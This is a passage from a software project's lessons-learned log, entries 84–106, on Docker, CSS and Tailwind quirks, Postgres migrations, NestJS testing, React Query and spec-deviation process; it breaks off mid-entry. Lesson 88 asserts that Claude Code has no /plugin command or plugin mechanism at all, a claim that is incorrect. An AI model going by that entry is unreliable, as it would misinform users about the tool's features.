- Mental model: `docker restart` = "bounce the process". `docker-compose up -d` = "apply config changes and recreate if needed".
- If a value you just set in `.env` is not taking effect → always reach for `docker-compose up -d`, not `docker restart`.
- Quick diagnostic: `docker inspect sign-backend | grep -A5 '"Env"'` shows the env the running container was actually created with.

---

## 84. Security — Multiple Frontend Pages Can Route to Different Backend Endpoints for the Same Feature

**Problem:**
`ProfilePage.tsx` and `MySecurityPage.tsx` both have password-change forms. `ProfilePage.tsx` was calling the legacy unprotected `PATCH /auth/change-password` endpoint. `MySecurityPage.tsx` was correctly calling the hardened `POST /me/change-password` endpoint. Same UX feature, completely different security guarantees (no reuse check, no history, no security event on the legacy path), no error anywhere — it just silently worked with weaker protection.

**Root Cause:**
When auditing or hardening a backend endpoint, the investigation focused on the endpoint and its DTO. The frontend was never grepped for all call sites. The assumption was "one feature = one endpoint". In reality two separate pages had been built at different times, each wiring up their own API call independently.

**Fix:**
Migrated `ProfilePage.tsx` to use `meService.changePassword()` (the hardened path via `POST /me/change-password`). Added deprecation comments on the two legacy endpoints (`PATCH /auth/change-password` in `auth.service.ts`, `PUT /users/me/password` in `users.service.ts`). Updated client-side min-length check in `ProfilePage.tsx` from 8 → 12 to match the backend DTO.

**How to Avoid:**
When hardening any backend endpoint, always grep the **entire frontend** for all call sites before concluding the work is done:
```bash
grep -rn "change-password\|changePassword\|change_password" apps/sign/src/
```
Do not assume one page = one endpoint. The same UX feature may have been independently implemented in multiple pages at different times.

---

## 85. Frontend — Browser Default Fonts Do Not Inherit Into Button and Input Elements

**Problem:**
During Phase 6.2 (Coming Soon cards on the MANAGEX landing), the "Notify Me" button rendered in the platform default UI font even though the parent card and the page-level `body` rule both set `font-family: var(--f-body)` (DM Sans). The input and the button looked visually inconsistent with the surrounding card copy — robotic and slightly off-brand. No console warning, no build error, no failed test — just wrong-looking output.

**Root Cause:**
`font-family` is an inherited CSS property in general — but `<button>`, `<input>`, `<select>`, and `<textarea>` are user-agent form controls that explicitly opt OUT of `font-family` inheritance in every major browser. They fall back to the platform default UI font (San Francisco on macOS, Segoe UI on Windows, etc.) unless `font-family` is set explicitly on the element itself (or on a selector that targets it specifically). This is by design — historically form controls were styled by the OS, not the page.

This trips up developers because most other inherited properties (`color`, `line-height`, `letter-spacing`) DO flow through to form controls — only the font family is special-cased.

**Fix:**
```css
/* WRONG — relies on inheritance that does not happen for form controls */
.mx-product--soon { font-family: var(--f-body); }

/* RIGHT — set the font explicitly on the control itself */
.mx-product__notify-input,
.mx-product__notify-btn {
  font-family: var(--f-body);
}
```

A blunter alternative is a global reset:
```css
button, input, select, textarea { font-family: inherit; }
```
But that hides the issue from future developers who think inheritance "just works".

**How to Avoid:**
- Every `<button>` and `<input>` rule in the codebase MUST declare `font-family` explicitly. Treat it the same as `font-size` and `padding` — a required property, not an optional one.
- When auditing a design that looks "slightly off" but you can't articulate why, check the form controls first. The default UI font is close enough to common web fonts that it can read as just "robotic" rather than obviously wrong.
- Same rule applies to MANAGEX landing CSS and all SIGN app forms.

---

## 86. UI — Audit the Live Section Background Before Specifying Card Surface Colour

**Problem:**
Phase 6.2's original implementation prompt specified the Coming Soon cards should have a "dark card background slightly lighter than the page background." But the MANAGEX Products section uses `var(--light-2)` (#F7F8FA) and the existing SIGN.ai card on the same row uses `var(--light)` (#FFFFFF). Following the prompt literally would have produced 5 dark cards sitting next to 1 white card in a 3×2 grid — visually broken, and it would have violated the "SIGN card unchanged" hard rule by association.

**Root Cause:**
Implementation prompts are sometimes written from memory or from a screenshot of a different part of the design. The MANAGEX landing alternates dark and light zones (Phase 4 rebrand established this pattern). Without re-checking the running page, it's easy to specify a card colour appropriate for the dark zone when the section in question is actually in a light zone.

**Fix:**
Before writing or following any implementation prompt that names a specific card-surface colour:
1. Open the running app at the exact section in question.
2. DevTools → inspect the section element. Note the `background-color` from computed styles.
3. Compare to the prompt's specified card colour. If they conflict, **stop and ask** before implementing.
4. Match adjacent existing cards in the same grid row by default — visual consistency at the row level is more important than literal prompt wording.

**How to Avoid:**
- For every card / panel / surface implementation, the FIRST step is to identify the actual section background colour in the live app. Not from memory. Not from CSS variable names — from `getComputedStyle()` on the running element.
- Hard rule from Phase 6.2: do not change the SIGN.ai card to match new sibling cards. The card surface decision must adapt to the existing live design, not the other way around.

---

## 87. Architecture — Replace Brittle String-Split Render Logic With Index-Based Logic

**Problem:**
The MANAGEX landing Why-section originally rendered the `visual` array with branching logic that parsed string content to decide colour:
```jsx
row.visual.map((line, idx) => (
  <div className="mx-why__visual-line">
    {line.includes('/') ? (
      <>
        <span>{line.split('/')[0]}</span>
        <span style={{ color: 'var(--mx-cyan)' }}>/{line.split('/')[1]}</span>
      </>
    ) : (
      <>
        <span>{line.replace('.', '')}</span>
        <span style={{ color: 'var(--mx-cyan)' }}>.</span>
      </>
    )}
  </div>
))
```
This tied the cyan colouring to two completely orthogonal copy decisions: whether the string contained `'/'` and whether it contained `'.'`. Editing the copy could silently break the styling. In Phase 6.3 the `'/'` separator was removed from the strings (`'/ one brain'` → `'one brain'`) — which would have killed the cyan rendering entirely under the old logic.

**Root Cause:**
Mixing visual decisions with content parsing creates an implicit, undocumented coupling between the data and the renderer. A future copy edit by a non-engineer (or by anyone who hasn't read the renderer) can break the visual without producing any error.

**Fix:**
Replaced with an index-based renderer where the **last item** in each visual array gets the accent colour. The contract is now explicit in the data shape, not hidden in the rendering logic:
```jsx
row.visual.map((line, idx, arr) => (
  <div className="mx-why__visual-line">
    <span style={idx === arr.length - 1 ? { color: 'var(--mx-cyan)' } : undefined}>
      {line}
    </span>
  </div>
))
```
Now editing the copy (e.g. `'one brain'` → `'one platform'`) preserves the cyan styling automatically. Removing or adding a glyph in the copy has zero effect on rendering.

**How to Avoid:**
- If a renderer parses the content of a string to decide visual styling, that's a smell. Look for an index- or shape-based alternative.
- Prefer "data has a known shape, styling follows the shape" over "styling inspects content character-by-character".
- When a copy edit can break a render, the render is wrong, not the copy.
- Same principle applies anywhere in the codebase that uses `string.includes()` or `string.split()` to drive JSX branches — Phase 6.3 fixed the MANAGEX Why-renderer; audit similar patterns when found.

---

## 88. Tooling — Claude Code Has No /plugin Command — Extensibility Is via Custom Commands, MCP, Hooks, and Skills

**Problem:**
Attempted to run `/plugin install frontend-design@claude-plugins-official` and `/plugin install code-review@claude-plugins-official`. Neither command exists. Claude Code returned no output and nothing was installed.

**Root Cause:**
A false assumption that Claude Code has a plugin registry similar to VS Code extensions or npm packages. It does not. There is no `/plugin` command, no `claude-plugins-official` registry, and no plugin install mechanism of any kind.

**The four real extensibility mechanisms:**
1. **Custom commands** — add `.md` files to `.claude/commands/`. Each file becomes a `/filename` slash command available in any session. Example: `.claude/commands/review.md` → `/review`.
2. **MCP servers** — `claude mcp add <name> <command>` or edit `"mcpServers"` in `.claude/settings.json`. Connects Claude Code to external tools (databases, APIs, design tools, etc.).
3. **Hooks** — edit `"hooks"` in `.claude/settings.json`. Fire shell commands on tool events (e.g. run a linter after every file edit).
4. **Skills** — add to `.claude/skills/`. More structured than custom commands; can accept parameters and have richer logic.

**Fix:**
Created `.claude/commands/review.md` as a custom command (the real equivalent of what "Code Review plugin" was meant to do). For "Frontend Design" — native Claude Code multimodal capabilities already handle design review; no install needed.

**How to Avoid:**
Before attempting any Claude Code command, verify it exists:
```bash
claude --help
```
Or check the Anthropic Claude Code documentation. If a command is suggested (by a human or AI) and it's not in `claude --help`, it does not exist. Do not attempt it.

---

## 89. Frontend — The layout shell is the mobile blocker; fix it first

**Problem:**
Page-level responsive classes (`grid-cols-1 md:grid-cols-2`, `flex-col md:flex-row`, etc.) had no visible effect on mobile. Dashboard tiles still clipped, contract pages still required horizontal scroll. Adding more responsive classes to individual pages didn't help.

**Root Cause:**
The shell (`AppLayout.tsx` + `Sidebar.tsx` + `TopBar.tsx`) hard-locked `<main>` to `ml-[240px]` and the sidebar to `fixed w-[240px]` at every viewport. On a 375 px screen that leaves 135 px of usable content width regardless of how many responsive classes a page declares. Same problem in `AdminLayout.tsx` with `marginLeft: 64`. Until the shell collapses the sidebar off-canvas and frees the margin on mobile, no page-level mobile fix has any effect.

**Fix:**
Phase 6.4 Step 1 + Step 2 — see CLAUDE.md "Phase 6.4 — Mobile Responsive Design". The shell now uses `ml-0 md:ml-[240px]` (or `md:ml-16` for AdminLayout), the sidebar transforms off-canvas below `md`, and a hamburger in the top bar opens the drawer with a backdrop overlay.

**How to Avoid:**
When you start any mobile work in a sidebar-based app, before touching page components, audit:
1. Does `<main>` have a fixed margin equal to the sidebar width at every viewport?
2. Is the sidebar `fixed` with `w-[N]` and no responsive transform?
3. Is there a hamburger in the top bar?
If any answer is "no, problem present", the shell is the blocker. Don't touch pages until the shell is mobile-aware.

---

## 90. Off-canvas sidebar pattern for React + Tailwind

**Problem:**
The first time you wire up a mobile sidebar drawer in a Tailwind app, the small details add up — which classes go on the sidebar vs. the main vs. the overlay, how to handle RTL, how to ensure the drawer closes on navigation, what tap-target size to use.

**Root Cause:**
There is no single canonical example for the off-canvas pattern that combines transform-based slide-in, RTL handling, route-change auto-close, and accessibility minima. Builds tend to miss one of those four legs.

**Fix:**
The four-leg off-canvas pattern (verified in Phase 6.4 Step 1):
1. **Sidebar transforms.** Closed: `ltr:-translate-x-full rtl:translate-x-full`. Open: `translate-x-0`. Desktop override: `md:ltr:translate-x-0 md:rtl:translate-x-0` (see Lesson 91 for why compound variants).
2. **Main content margin.** `ml-0 md:ltr:ml-[N] md:rtl:mr-[N]` where N is the sidebar width — no margin on mobile, sidebar-sized margin on desktop.
3. **Overlay backdrop.** Conditionally rendered when the drawer is open: `fixed inset-0 z-30 bg-black/50 md:hidden`. Sidebar is z-40 so it sits above. `onClick` closes the drawer.
4. **Auto-close on route change.** `useEffect(() => setMobileOpen(false), [location.pathname])` using `useLocation()` from react-router-dom.

Always 44 × 44 px minimum tap target for the hamburger and the in-drawer × button (WCAG / iOS HIG). Use `h-11 w-11 inline-flex items-center justify-center` to get exactly 44 px without manual sizing.

**How to Avoid:**
Use the pattern above end-to-end every time. Skipping route-change auto-close is the most common omission — without it, the drawer stays open on top of the new page after a tap.

---

## 91. Tailwind — `md:` sorts BEFORE `ltr:` / `rtl:` in the stylesheet

**Problem:**
After implementing off-canvas sidebar with `ltr:-translate-x-full md:translate-x-0`, the sidebar stayed off-canvas at desktop (1280 px). The class list contained `md:translate-x-0` but the computed transform read `--tw-translate-x: -100%`. The `ltr:-translate-x-full` rule was winning at desktop despite the `md:` override.

**Root Cause:**
Tailwind v3 generates CSS in a specific source order: unprefixed utilities → state variants (`ltr`, `rtl`, `hover`, etc.) → responsive variants (`sm`, `md`, etc.) → compound variants (`md:ltr`, `md:hover`, etc.). At desktop, `.md\:translate-x-0` was rule #1052 while `.ltr\:-translate-x-full:where(...)` was rule #1067 — so the `ltr:` rule came later and won the cascade. Both rules set the same `transform` declaration via `--tw-translate-x`, so source order decided the winner.

**Fix:**
Use compound variants `md:ltr:translate-x-0 md:rtl:translate-x-0` for the desktop override. Compound variants sort *after* single-variant `ltr:`/`rtl:` in the stylesheet, so they win at desktop while the single variants apply at mobile.

```tsx
// Wrong — `ltr:` wins at desktop because it sorts later
${mobileOpen ? 'translate-x-0' : 'ltr:-translate-x-full rtl:translate-x-full'} md:translate-x-0

// Right — `md:ltr:` and `md:rtl:` sort later than `ltr:` / `rtl:`
${mobileOpen ? 'translate-x-0' : 'ltr:-translate-x-full rtl:translate-x-full'} md:ltr:translate-x-0 md:rtl:translate-x-0
```

**How to Avoid:**
Any time you mix responsive (`md:`) and directional (`ltr:` / `rtl:`) variants on the same property, you need the compound form for the override. Verify with the DevTools "Rules" panel showing source order, or grep the generated stylesheet for both selectors and compare their position.

---

## 92. AdminLayout is LTR-only — no `ltr:` / `rtl:` variants exist or are needed

**Problem (avoided):**
Phase 6.4 Step 2 (AdminLayout mobile shell) initially looked like a copy of Step 1, including the compound `md:ltr:` / `md:rtl:` variants for the off-canvas transform.

**Root Cause:**
`AdminLayout.tsx` has no `ltr:`/`rtl:` variants anywhere — every position class is direction-agnostic (`left-0`, `right-0`, `marginLeft: 64`). The admin portal targets operations staff and is intentionally LTR-only. Without any `ltr:-translate-x-full` competing for the cascade, plain `md:translate-x-0` correctly overrides `-translate-x-full` (responsive variants sort after unprefixed utilities, so `md:` wins at desktop).

**Fix:**
Used the simpler `${mobileOpen ? 'translate-x-0' : '-translate-x-full'} md:translate-x-0` in AdminLayout. No compound variants. Documented the LTR-only status in CLAUDE.md "Hard rules from Phase 6.4" so future contributors know not to add `ltr:` / `rtl:` variants without a deliberate RTL plan that also handles the inline 64 px rail's position math.

**How to Avoid:**
Before copying a pattern from one layout to another, grep the target file for the variants the pattern uses. The workaround is only needed where the conflicting variant actually exists.

```bash
grep -nE '\b(ltr|rtl):' apps/sign/src/components/layout/AdminLayout.tsx
# empty → LTR-only, no compound variant needed
```

---

## 93. Process — Verify prompt assumptions against actual code before implementing

**Problem:**
Phase 6.4 Step 3D (ManageX mobile drawer) implementation prompt stated: "the existing @media (max-width: 768px) already hides .mx-nav__links and the ghost sign-in button" AND positioned the hamburger "same side as the hidden 'Get started' CTA". A naïve implementation might have re-hidden Get Started on mobile.

**Root Cause:**
The implementation prompt was written from memory or an earlier version of the codebase. The actual CSS at `apps/managex/src/index.css:1004-1005` hides only `.mx-nav__center` (the nav links) and `.mx-nav__cta .mx-btn--ghost-d` (the Sign in ghost button). Get Started (`.mx-btn--cyan`) was *never* hidden on mobile — it stayed visible as the primary CTA.

**Fix:**
Flagged the discrepancy in the response *before* coding, kept Get Started visible on mobile (the stronger primary-CTA pattern), and noted the prompt-vs-code drift in CLAUDE.md. Drawer mirrors the prompt's spec (Sign in + Get started both inside) for completeness even though Get Started is duplicated between the visible header and the drawer.

**How to Avoid:**
Before implementing from a written spec, treat any factual claim about existing code as a hypothesis. Verify with `grep`, `sed -n`, or a quick file read. Audit output is the source of truth, not prompt memory. Any time a prompt says "the existing X does Y", spend the 30 seconds to confirm. When discrepancies appear, surface them in your first reply, document them in the deliverable, and proceed with the correct behaviour.

---

## 94. PostgreSQL — ADD CONSTRAINT IF NOT EXISTS is invalid syntax

**Problem:**
Migration `1748000000002` initially used:
```sql
ALTER TABLE contracts
  ADD CONSTRAINT IF NOT EXISTS fk_contracts_escalation_user ...
```
PostgreSQL rejected this with `error: syntax error at or near "NOT"` because
`ADD CONSTRAINT IF NOT EXISTS` is not valid PostgreSQL syntax (even though
`DROP CONSTRAINT IF EXISTS` IS valid).

**Fix:**
Wrap the ADD CONSTRAINT in a `DO $$ BEGIN ... END$$` block that queries `pg_constraint`
first:
```sql
DO $$
BEGIN
  IF NOT EXISTS (
    SELECT 1 FROM pg_constraint WHERE conname = 'fk_contracts_escalation_user'
  ) THEN
    ALTER TABLE contracts
      ADD CONSTRAINT fk_contracts_escalation_user
        FOREIGN KEY (escalation_contact_user_id)
        REFERENCES users (id)
        ON DELETE SET NULL;
  END IF;
END$$;
```

**How to Avoid:**
- `DROP CONSTRAINT IF EXISTS` — ✅ valid PostgreSQL
- `ADD CONSTRAINT IF NOT EXISTS` — ❌ invalid PostgreSQL, use a `DO $$` block
- `ADD COLUMN IF NOT EXISTS` — ✅ valid PostgreSQL
- `CREATE INDEX IF NOT EXISTS` — ✅ valid PostgreSQL
- `CREATE TABLE IF NOT EXISTS` — ✅ valid PostgreSQL

Memorise: only the DROP variant supports IF NOT EXISTS inline.

---

## 95. DTO Design — @ValidateIf for mutually exclusive fields (XOR validation)

**Problem:**
The escalation contact on a contract can be either a platform user (`escalation_contact_user_id: UUID`) OR an external email (`escalation_contact_email: string`), but never both. Standard class-validator decorators have no built-in "exactly one of these" constraint.

**Fix:**
Use `@ValidateIf` to conditionally apply validators:
```typescript
// Only validate as UUID when escalation_contact_email is NOT present
@IsOptional()
@ValidateIf((o) => !o.escalation_contact_email)
@IsUUID()
escalation_contact_user_id?: string;

// Only validate as email when escalation_contact_user_id is NOT present
@IsOptional()
@ValidateIf((o) => !o.escalation_contact_user_id)
@IsEmail()
escalation_contact_email?: string;
```
This allows:
- Only `user_id` → passes
- Only `email` → passes
- Neither → passes (both optional)
- Both → both validators fire simultaneously — the UUID check on the email field
  fails, and the email check on the UUID field fails → 400

**How to Avoid:**
Whenever two DTO fields are mutually exclusive, reach for `@ValidateIf` before
trying to write a custom class-validator decorator. This is the class-validator
idiomatic solution.

---

## 96. Testing — Mock guards must THROW to produce 401, not return false

**Problem:**
In NestJS HTTP tests using supertest, a guard mock that returns `false` from
`canActivate()` triggers `ForbiddenException` (HTTP 403), not `UnauthorizedException`
(HTTP 401). Tests asserting `expect(res.status).toBe(401)` then fail with
`Expected: 401 / Received: 403`.

**Root Cause:**
When `canActivate()` returns `false`, NestJS core throws `ForbiddenException`
(generic "access denied"). The real `JwtAuthGuard` (extends `AuthGuard('jwt')`)
throws `UnauthorizedException` internally when passport fails — that's why the
real app returns 401 for missing tokens.

**Fix:**
Make the mock guard throw `UnauthorizedException` when no valid token is present:
```typescript
const mockJwtGuard = {
  canActivate: (ctx: ExecutionContext) => {
    const req = ctx.switchToHttp().getRequest();
    if (!req.headers.authorization?.includes('valid-token')) {
      throw new UnauthorizedException();  // ← throw, don't return false
    }
    req.user = MOCK_USER;
    return true;
  },
};
```

**How to Avoid:**
When writing mock guards for HTTP tests:
- Return `true` to simulate authenticated access
- `throw new UnauthorizedException()` to simulate 401 Unauthorized
- `throw new ForbiddenException()` to simulate 403 Forbidden
- Never return `false` if you need a specific HTTP status code


## 97. Plan-Gating UI — Defer When the Tier Model Doesn't Exist Yet

**What happened:** Phase 7.1 Step 2 spec called for "Starter plan users see an
upgrade prompt; Professional/Enterprise see the full portfolio." But the
codebase has no plan-tier enum — `SubscriptionPlan` rows are admin-editable in
the admin portal, and `OrganizationSubscription.plan.name` is a free-form
string. There is no canonical "STARTER" identifier anywhere.

**Why it matters:** The obvious shortcut is to write
`if (plan?.name?.toLowerCase().includes('starter'))`. That code looks fine in
review and ships. Six months later an admin renames the plan to "Starter Plus"
or "Solo" — and every gated feature in the app silently flips, with no compile
error, no test failure, and no admin warning. This is the worst class of bug:
data-driven UI changes triggered by a UI action in an unrelated surface.

**Three real options when this comes up:**
1. **Defer entirely.** Show the feature to everyone and call it out in the PR
   description + a lessons.md note + CLAUDE.md "what's deferred" block.
   This is what Step 2 did. Cost: short-term revenue gap on the gating side.
   Benefit: no rework when the real plan model lands.
2. **Quota-based proxy** (`plan.max_projects <= 1`). More resilient than name
   matching but couples gating logic to a quota field that admins may change
   for unrelated reasons.
3. **Feature flag in `plan.features` jsonb.** The cleanest long-term answer.
   Requires a one-line backend seed update + a UI helper like
   `usePlanFeature('portfolio_view')`. Worth doing the proper time, not as a
   side-quest inside a frontend-only step.

**Rule:** Never ship name-string gating against admin-editable strings. If the
gating model doesn't exist yet, defer the gate and document the deferral.
"Defer" is a legitimate engineering decision — write it down in CLAUDE.md
under the phase's "what's deferred" section and link the lesson here so the
next person doesn't quietly re-introduce the shortcut.

---

## 98. Reuse Existing Service Types — Don't Re-Declare Across Service Files

**What happened:** Phase 7.1 Step 2 spec said the new portfolio endpoint
returns "enriched ContractObligation with project + assignees." The temptation
on the frontend was to re-declare `ObligationStatus`, `ObligationType`, and
`ContractObligation` in `obligationService.ts` so portfolio code wouldn't
have to cross-import from `complianceService.ts`.

**Why it matters:** Each duplicate copy is one more place that drifts when
the backend enum changes. Phase 3.4 had already added MET and WAIVED to
`ObligationStatus`; if a Step-2 copy of the enum hadn't included them, the
new components would have shown stale six-value dropdowns while the backend
accepted the new statuses — visible only when a user picked one. There's
no compile error, no test failure, just a silently wrong UI.

**The fix that shipped:** `obligationService.ts` imports
`ObligationStatus`, `ObligationType`, `ContractObligation` from
`complianceService.ts` and re-exports them. Callers get one import path.
`ObligationPortfolioItem` is declared in `obligationService.ts` (because
it's portfolio-specific) and `extends ContractObligation` so it inherits
every field automatically when the base type grows.

**Rule:** If two services touch the same domain object, ONE is the type
owner and the other imports + re-exports. Pick the older surface (here,
`complianceService` because Phase 3.4 added the types first) as the owner.
Re-exporting is free at runtime and lets callers stay agnostic about which
service owns what. Duplicate `export type` declarations across services are
a regression — search-grep the type name before adding it to a second file.

---

## 99. Inserting a Tab Into a 2,308-Line File — Three Edit Points, In Order

**What happened:** Phase 7.1 Step 2 needed a new Obligations tab in
`ContractDetailPage.tsx` between Risk Analysis and Claims. The file is 2,308
lines and the tabs are wired through three separate locations: the
`tabConfig` array, the `activeTab` state-type union, and the per-tab content
block. Edit one without the others = a tab that either won't render, or
renders but never becomes active, or crashes on selection.

**The three edit points (in execution order):**
1. **`tabConfig` array** (~line 236). Add the new entry — `{ key, label, icon,
   activeOnly? }` — in the desired position. The order in this array is the
   visual order in the nav bar. NOT `activeOnly: true` if the tab should work
   on DRAFT contracts (different from Claims / Notices / Sub-Contracts which
   gate on `contract.status === 'ACTIVE'`).
2. **`activeTab` state-type union** (~line 259). Add the new key string to
   the union: `useState<'clauses' | 'comments' | ... | 'new-tab' | ...>('clauses')`.
   Skipping this gives a TypeScript error on the `setActiveTab(tab.key)` call
   inside the render loop — that's actually a helpful safety net, but only
   if you don't suppress it.
3. **Per-tab content block** (~line 1671+). Add `{activeTab === 'new-tab' && (...)}`
   between the existing blocks, matching the spot in the visual order. If
   the tab needs status gating, add the condition here too:
   `{activeTab === 'claims' && contract.status === 'ACTIVE' && (...)}`.

**Optional fourth edit — count badge.** If the tab label should show a count
pill (like Clauses / Comments / Risks / Approvals do), add a clause in the
render loop (~line 1239+). The pattern is
`{tab.key === 'new-tab' && count > 0 && <span className="rounded-full ...">{count}</span>}`.
For ObligationsTab Step 2, the count comes from inside the child via an
`onCountChange` callback so the parent doesn't re-fetch.

**Rule:** Before editing a long page file with tab structure, grep for the
existing tab key (e.g. `risks` for the tab right before yours) — three
matches typically: tabConfig entry, state-type union, content block. Your
new tab needs the same three. If the grep returns four (count badge), do
four. Skipping any of the four is the silent-failure path.


---

## 100. react-big-calendar — Wire the date-fns Localizer Per-Language

**What happened:** Phase 7.1 Step 3 added `react-big-calendar` for the
`/app/obligations/calendar` page. The Calendar component requires a
localizer instance, and the standard recipe online uses a module-level
`dateFnsLocalizer({ format, parse, ... })` call. That works in EN-only
apps but produces month/day labels that never switch when the user
toggles language inside SIGN — the localizer holds the locale at
module-load time.

**Why it matters:** SIGN supports EN/AR/FR via `i18next` runtime
switching. A static localizer pins the calendar to English even when
the rest of the page is rendering Arabic.

**Fix:** Compute the localizer inside the component via
`useMemo(() => dateFnsLocalizer({ ..., culture: pickFrom(i18n.language) }),
[i18n.language])`. Pass `locales: { 'en-US': enUS, ar, fr }` so RBC
can resolve any of the three. Also pass `culture` as a Calendar prop
matching the current language — the toolbar messages use that key.

**Rule:**
- Always memoize the RBC localizer on the active i18n language.
- Always import all three date-fns locales (`enUS`, `ar`, `fr`) when
  any obligation surface might render them — the locale package is
  small.
- Calendar's parent container MUST set a deterministic height
  (`height: '70vh', minHeight: 500`). RBC measures the DOM and gets
  stuck at 0px if the parent is `height: auto`.

---

## 101. The Two-Step File Upload — Evidence URL Today, Multipart Later

**What happened:** Step 3's MarkActionedModal needs an "evidence upload"
to attach a file to an obligation. The prompt assumed a generic file
upload endpoint existed. Audit revealed: every backend `FileInterceptor`
is entity-scoped (knowledge assets, organization policies, support
attachments, document processing, parse-docx). There is no generic
`POST /uploads` that returns a URL.

The backend's `PUT /contracts/:id/obligations/:oblId/evidence` accepts
`{ evidence_url: string }` — it expects a URL already hosted somewhere.

**Why it matters:** Adding a new multer endpoint would violate Hard
Rule #2 (no backend changes). Picking a wrong upload endpoint
(e.g. knowledge assets) would write the file under the wrong entity's
permission scope and break later integrity audits.

**Fix:** Documented the gap to the user up front and asked which path
to take. User chose: URL input field + protective message + lessons.md
note for the future backend work.

**Rule:**
- When the prompt assumes infrastructure that doesn't exist, surface it
  as a clarifying question BEFORE building — don't silently substitute
  a different implementation.
- The two-step evidence-update flow IS the eventual pattern even after
  multipart upload exists: upload (multipart) returns a URL, then
  `updateEvidence` attaches it. Step 3 implements step 2 of that flow.
  When Step 4+ adds the upload endpoint, the MarkActionedModal only
  needs a new component for the file picker — the second step is
  already there.

---

## 102. Drawer vs Modal — When to Use Which

**What happened:** Phase 7.1 Step 3 introduced both patterns into the
obligation UI for the first time. Drawer for detail viewing
(`ObligationDetailDrawer`), modals for actions (Add/Edit, Mark Actioned,
Assign). The choice wasn't arbitrary.

**Rule of thumb:**
- **Use a modal when the user is performing an action with a clear
  start and end** — fills a form, confirms a state change, picks one
  option. Modal demands a decision. Examples: AddEdit, MarkActioned,
  Assign, "Confirm delete?", "Approve this contract?".
- **Use a drawer when the user is exploring or reviewing**, possibly
  taking actions but mostly reading. Drawer affords scanning without
  committing. The drawer can launch modals when the user shifts from
  "review" to "act" — that's the canonical handoff.

**Mechanical differences in this codebase:**

| Aspect | Modal (`ModalShell`) | Drawer (`ObligationDetailDrawer`) |
|---|---|---|
| Position | Centered over backdrop | Right-anchored slide-in |
| Size on desktop | `max-w-{md|lg|2xl}` | Fixed `w-[480px]` |
| Size on mobile | Full-width with 16px padding | Full-width |
| Click outside | Closes | Closes (via overlay div sibling) |
| Body scroll | Inner div scrolls | Inner div scrolls |
| Footer | Two-button (cancel + primary) | Two-button (secondary + primary) |
| Launches more modals? | No (would stack badly) | YES (drawer is the launcher) |
| State held | Form state | Read-only fetched record |

**Hard rule:** Never stack modal-on-modal in this codebase. If a modal
needs to launch another action, close the first and open the second
(or restructure to use a drawer as the parent).

---

## 103. Silent catch in TypeORM migrations hides type-name bugs (recurrence of #31)

**Context:** Phase 7.1 Step 3 verification (2026-05-25) discovered that
`1718000000002-AddComplianceMonitoring.ts` had been claiming success for
weeks while doing nothing. The migration's `ALTER TYPE` referenced
`obligations_status_enum` (wrong name) instead of `obligation_status`
(actual Postgres type). The wrapping
`EXCEPTION WHEN undefined_object THEN null` swallowed the
"type does not exist" error. The migrations table marked the migration
done; the database had no MET/WAIVED enum values.

**Lesson:** This is the same anti-pattern as lesson #31 — silent
exception handlers in migrations turn schema drift into a
multi-environment time bomb. Every database that ran the broken
migration recorded success while skipping the real work.

**Rules going forward:**
1. Migrations may use `IF NOT EXISTS` / `IF EXISTS` clauses for
   idempotency, but never wrap them in catch-all exception handlers that
   silently return null.
2. If a catch IS required (e.g. handling pg version differences), it
   must log a warning so the failure is visible in deploy logs.
3. After any migration that mutates an enum or type, the migration
   itself should `SELECT` and assert the post-state. If the assertion
   fails, throw — let the migration framework mark it failed.
4. Add a startup health check that validates enums have all expected
   values. Fail loud at boot if the schema doesn't match the code's
   expectations.

**Tracked fix:** Phase 7.3 in NEXT_PHASES.md.

---

## 104. Real-time deviation reporting > post-hoc commit-message justification

**Context:** Phase 7.1 Step 3 i18n work shipped without the TODO markers
the original prompt explicitly required. The decision was documented in
the commit message as "production quality; no TODO placeholders needed"
but never surfaced to the prompt author for sign-off. The verification
pass two days later flagged the divergence and required a retroactive
fix (greppable `_TODO_*` parallel keys + a 7.16 ticket for legal-
translator review).

**Lesson:** Spec deviations should be raised as clarifying questions
before committing, not justified in commit messages after the fact. The
commit message is a record, not a permission slip. If a prompt says
"do X" and during implementation X seems unnecessary or counterproductive,
the answer is to stop and ask, not to skip X and explain why later.

**Rules going forward:**
1. If an implementation pass concludes a documented requirement is no
   longer needed, raise it as a STOP-and-report before committing.
2. Commit messages may explain implementation choices within the
   specified scope. They are not the venue for deviations from the
   spec itself.
3. "It seemed unnecessary" is not sufficient justification for
   bypassing an explicit requirement that has a forward-looking
   purpose (like translator-review traceability — the missing TODOs
   removed a literal grep-able worklist a future translator engagement
   would have used).
4. The cost of a quick clarifying question is far lower than the cost
   of retroactive cleanup once the divergence is discovered.

**Tracked fix:** Phase 7.16 in NEXT_PHASES.md, plus the
`_TODO_*` parallel-key pattern in `ar/common.json` and `fr/common.json`
restored in this housekeeping pass.

## 105. `useState + useEffect` for periodically-changing server data is silently stale

**Context:** Phase 7.1 Step 4 scoping (2026-05-25). TopBar's bell badge
fetched the unread count exactly once via `useEffect(() => { … }, [])` on
mount. It then sat there showing the stale value for the entire session
unless the user hard-refreshed the page. Same pattern was duplicated in
AdminLayout. NotificationsPage used the same `useState + useEffect` shape
with `[filter]` as the only dep — visiting the page and waiting did not
surface new rows.

The bug went unnoticed for months because every "did it work?" check
involved a page reload, which masked the staleness by re-mounting the
component and re-firing the effect.

**Lesson:** Data that changes server-side over the lifetime of a
component MUST come through a query layer with a polling cadence (React
Query `refetchInterval`, SWR `refreshInterval`) — not through a one-shot
`useEffect` on mount. The `useState + useEffect` pattern for periodic
data is a stale-by-design footgun: it works on first render, looks
correct in screenshots, and silently grows wrong over time.

**Rules going forward:**
1. Any component that reads a count, list, or status that another part
   of the system can mutate asynchronously must use React Query (the
   project's standard) with `refetchInterval`. No exceptions for
   "lightweight" components.
2. When migrating one-shot effects to query layer, also add the
   `refetchIntervalInBackground: false` option so polling pauses on
   tab blur — backend load should be proportional to active users, not
   open tabs.
3. When reviewing PRs, treat any `useEffect(fn, [])` that triggers a
   network fetch as a yellow flag. Either the data truly never
   changes (rare) or it should be a query.

**Tracked fix:** PR for Phase 7.1 Step 4 — three consumers
(NotificationsPage, TopBar, AdminLayout) migrated to React Query with
shared queryKey `['notifications', 'unread-count']`.

## 106. Shared queryKey for cross-component cache coherence

**Context:** TopBar's bell badge and AdminLayout's bell badge are two
separate components rendered on disjoint route trees (`/app/*` vs
`/admin/*`). They both want the same unread count, and when one screen
mutates that count (mark-as-read on `/app/notifications`), the other
screen should reflect the change without a page navigation.

The reflex solution is per-component state with imperative cross-tree
messaging (a bus, a Redux slice, a context). React Query offers a
cleaner option: any two components reading the same `queryKey` share
